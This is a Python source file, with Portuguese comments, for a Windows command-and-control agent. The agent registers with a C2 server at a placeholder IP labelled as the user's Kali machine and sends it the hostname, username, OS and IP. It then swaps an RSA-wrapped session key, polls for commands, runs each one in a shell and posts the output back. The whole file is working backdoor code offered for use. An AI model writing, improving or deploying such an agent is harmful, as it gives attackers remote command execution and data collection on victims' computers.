#!/usr/bin/env python3
# agents/encrypted_agent.py - Agente com criptografia

import os
import sys
import time
import uuid
import socket
import platform
import subprocess
import requests
import json
import base64
from datetime import datetime
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util.Padding import pad, unpad
import secrets

# ============================================
# CONFIGURAÇÕES DIRETAS (MUDE AQUI)
# ============================================
C2_URL = "http://192.168.1.100:5000"  # ← MUDE PARA IP DO SEU KALI
HEARTBEAT_INTERVAL = 5  # segundos

class EncryptedAgent:
    def __init__(self):
        self.c2_url = C2_URL
        self.agent_id = None
        self.rsa_public_key = None
        self.session_key = None
        self.interval = HEARTBEAT_INTERVAL
        
    def get_system_info(self):
        return {
            'hostname': socket.gethostname(),
            'username': os.getlogin(),
            'os_version': platform.platform(),
            'ip': socket.gethostbyname(socket.gethostname())
        }
    
    def register(self):
        """Registra no servidor e obtém chave pública RSA"""
        try:
            info = self.get_system_info()
            info['agent_id'] = self.agent_id or str(uuid.uuid4())
            
            print(f"[*] Registrando no C2: {self.c2_url}")
            resp = requests.post(f"{self.c2_url}/register", json=info, timeout=10)
            
            if resp.status_code == 200:
                data = resp.json()
                self.agent_id = data['agent_id']
                
                # Carrega chave pública RSA do servidor
                public_key_pem = data['public_key']
                self.rsa_public_key = RSA.import_key(public_key_pem)
                
                print(f"[+] Registrado! ID: {self.agent_id[:8]}")
                return self._handshake()
            return False
        except Exception as e:
            print(f"[-] Erro no registro: {e}")
            return False
    
    def _handshake(self):
        """Handshake criptográfico - envia chave AES criptografada com RSA"""
        try:
            # Gera chave de sessão AES-256
            self.session_key = secrets.token_bytes(32)
            
            # Criptografa com RSA pública do servidor
            cipher_rsa = PKCS1_OAEP.new(self.rsa_public_key)
            encrypted_key = cipher_rsa.encrypt(self.session_key)
            encrypted_b64 = base64.b64encode(encrypted_key).decode()
            
            # Envia chave criptografada
            resp = requests.post(f"{self.c2_url}/exchange_key", json={
                'agent_id': self.agent_id,
                'session_key': encrypted_b64
            }, timeout=10)
            
            if resp.status_code == 200:
                print("[+] Handshake completo! Comunicação segura estabelecida")
                return True
            return False
        except Exception as e:
            print(f"[-] Erro no handshake: {e}")
            return False
    
    def execute_command(self, command):
        """Executa comando no Windows"""
        try:
            if command.lower().startswith('cd '):
                os.chdir(command[3:])
                return f"Diretório alterado: {os.getcwd()}"
            
            result = subprocess.run(command, shell=True, 
                                  capture_output=True, text=True, timeout=30)
            
            output = result.stdout if result.stdout else result.stderr
            return output if output else "[+] Comando executado (sem saída)"
        except Exception as e:
            return f"[-] Erro: {e}"
    
    def run(self):
        """Loop principal"""
        print("""
        ╔═══════════════════════════════════════╗
        ║   🔐 ENCRYPTED C2 AGENT - WINDOWS    ║
        ╚═══════════════════════════════════════╝
        """)
        
        if not self.register():
            print("[-] Falha no handshake. Encerrando.")
            return
        
        print(f"[*] Heartbeat a cada {self.interval}s. Aguardando comandos...\n")
        
        while True:
            try:
                # Busca tarefas
                resp = requests.get(f"{self.c2_url}/tasks", 
                                   params={'agent_id': self.agent_id},
                                   timeout=10)
                
                if resp.status_code == 200:
                    tasks = resp.json().get('tasks', [])
                    
                    for task in tasks:
                        print(f"[*] Executando: {task['command']}")
                        result = self.execute_command(task['command'])
                        
                        # Envia resultado
                        requests.post(f"{self.c2_url}/results", json={
                            'agent_id': self.agent_id,
                            'task_id': task['id'],
                            'result': result
                        }, timeout=10)
                        
                        print(f"[+] Resultado enviado (task {task['id']})")
                
                time.sleep(self.interval)
                
            except KeyboardInterrupt:
                print("\n[!] Agente interrompido")
                break
            except Exception as e:
                print(f"[-] Erro: {e}")
                time.sleep(self.interval)

if __name__ == '__main__':
    agent = EncryptedAgent()
    agent.run()